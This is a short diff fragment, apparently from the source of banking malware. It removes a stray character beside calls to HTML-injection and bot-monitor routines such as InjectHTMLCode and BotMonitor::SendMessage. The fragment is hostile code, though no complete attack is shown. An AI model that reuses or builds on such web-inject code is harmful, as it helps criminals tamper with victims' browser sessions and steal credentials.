@@ -1107,7 +1107,7 @@ bool InjectHTMLCode(PRequest Request, PHTMLInject Inject) {
 				BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigDataExec, (PCHAR)&SourceData->ID, sizeof(SourceData->ID));
 			#endif
 
-			#ifdef BV_APP                                               s
+			#ifdef BV_APP                                               
 				CallHTMLInjectEvent(SourceData, injDataHandled, NULL);
 			#endif
 		}
